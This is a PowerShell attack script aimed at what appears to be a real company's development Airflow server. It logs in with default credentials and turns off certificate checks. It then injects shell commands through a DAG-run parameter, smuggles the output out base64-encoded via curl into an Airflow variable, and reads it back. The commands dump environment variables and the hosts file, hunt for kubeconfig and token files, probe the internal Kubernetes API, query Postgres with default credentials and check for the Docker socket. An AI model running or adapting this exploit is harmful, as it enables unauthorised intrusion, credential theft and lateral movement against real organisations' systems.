Add-Type @"
using System.Net;
using System.Security.Cryptography.X509Certificates;
public class TrustAll : ICertificatePolicy {
    public bool CheckValidationResult(ServicePoint sp, X509Certificate cert, WebRequest req, int problem) { return true; }
}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAll
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

$base = "https://dev-airflow.kbfinansia.com"
$encoded = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("airflow:airflow"))

function AF-Post($path, $body) {
    try {
        $req = [System.Net.WebRequest]::Create("$base$path"); $req.Method = "POST"; $req.ContentType = "application/json"
        $req.Headers.Add("Authorization", "Basic $encoded")
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($body); $req.ContentLength = $bytes.Length
        $s = $req.GetRequestStream(); $s.Write($bytes,0,$bytes.Length); $s.Close()
        $resp = $req.GetResponse(); $r = New-Object System.IO.StreamReader($resp.GetResponseStream()); return $r.ReadToEnd()
    } catch [System.Net.WebException] {
        if ($_.Exception.Response) { $r = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream()); return "ERR:" + $r.ReadToEnd() }
        return "EXC:" + $_.Exception.Message
    }
}

function AF-Get($path) {
    try {
        $req = [System.Net.WebRequest]::Create("$base$path"); $req.Method = "GET"
        $req.Headers.Add("Authorization", "Basic $encoded"); $req.Accept = "application/json"
        $resp = $req.GetResponse(); $r = New-Object System.IO.StreamReader($resp.GetResponseStream()); return $r.ReadToEnd()
    } catch [System.Net.WebException] {
        if ($_.Exception.Response) { $r = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream()); return "ERR:" + $r.ReadToEnd() }
        return "EXC:" + $_.Exception.Message
    }
}

function Exfil($cmd) {
    $ts = [DateTimeOffset]::UtcNow.ToString("yyyy-MM-ddTHH:mm:ssZ")
    $inject = '30"; (' + $cmd + ') 2>&1 | head -c 3000 | base64 -w0 | xargs -I{} curl -sk -X PATCH ' + $base + '/api/v1/variables/_pwn_test -H "Authorization: Basic ' + $encoded + '" -H "Content-Type: application/json" -d "{\"key\":\"_pwn_test\",\"value\":\"{}\"}"; echo "'
    $body = @{ conf = @{ maxLogAgeInDays = $inject }; logical_date = $ts } | ConvertTo-Json -Depth 10
    AF-Post "/api/v1/dags/maintenance_logs_cleanup/dagRuns" $body | Out-Null
    Start-Sleep 12
    $r = (AF-Get "/api/v1/variables/_pwn_test" | ConvertFrom-Json).value
    try { return [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($r)) }
    catch { return $r }
}

# Deep explore
Write-Host "=== FULL ENV ==="
Write-Host (Exfil "env | sort")

Write-Host "`n=== /etc/hosts ==="
Write-Host (Exfil "cat /etc/hosts")

Write-Host "`n=== NETWORK ==="
Write-Host (Exfil "ip route 2>/dev/null || route -n 2>/dev/null")

Write-Host "`n=== FIND KUBECONFIG/SA TOKEN ==="
Write-Host (Exfil "find /home /root /opt /etc /tmp /var -name '*.kubeconfig' -o -name 'kubeconfig' -o -name 'token' -o -name '*.token' 2>/dev/null | grep -v proc | head -20")

Write-Host "`n=== /opt/airflow content ==="
Write-Host (Exfil "ls -la /opt/airflow/ && ls -la /opt/airflow/.kube/ 2>/dev/null || echo NO_KUBE_DIR")

Write-Host "`n=== /home/airflow ==="
Write-Host (Exfil "ls -la /home/airflow/ && ls -la /home/airflow/.kube/ 2>/dev/null || echo NO_KUBE_DIR_HOME")

Write-Host "`n=== TEST K8s API from container ==="
Write-Host (Exfil "curl -sk https://10.9.100.10:6443/api 2>&1 | head -20")

Write-Host "`n=== POSTGRES CONNECTION ==="
Write-Host (Exfil "psql postgresql+psycopg2://airflow:airflow@postgres/airflow -c 'SELECT version();' 2>&1 || python3 -c 'import psycopg2; c=psycopg2.connect(host=\"postgres\",user=\"airflow\",password=\"airflow\",dbname=\"airflow\"); print(c.server_version)' 2>&1")

Write-Host "`n=== Docker socket ==="
Write-Host (Exfil "ls -la /var/run/docker.sock 2>/dev/null && docker ps 2>/dev/null | head -10 || echo NO_DOCKER_SOCKET")
